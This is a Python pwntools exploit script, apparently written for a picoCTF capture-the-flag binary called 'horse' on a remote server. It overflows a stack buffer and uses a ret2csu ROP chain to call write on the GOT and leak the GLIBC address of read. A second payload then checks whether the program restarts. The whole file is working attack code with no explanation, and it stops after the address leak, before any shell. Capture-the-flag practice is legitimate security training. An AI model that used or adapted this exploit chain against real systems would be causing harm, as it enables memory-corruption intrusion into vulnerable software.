from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0

def leak_read():
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) * 6
    payload += p64(elf.symbols['main']) 

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        print(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except:
        exit()

leaked_read = leak_read()

# Payload 2: write(1, got_read, 1)
payload2 = b'A' * 32
payload2 += b'B' * 8
payload2 += p64(csu_pop)
payload2 += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(1)
payload2 += p64(csu_call)
payload2 += b'J' * 8 
payload2 += p64(csu_pop)
payload2 += p64(0) * 6
payload2 += p64(0xdeadbeef)

print("Sending Payload 2...")
r.sendline(payload2)
r.recvuntil(b'/     /   \xc2\xb4\n') # Horse output from 2nd run

try:
    d = r.recvn(1)
    print("Restart SUCCESS!")
except:
    print("Restart FAILED.")

r.close()
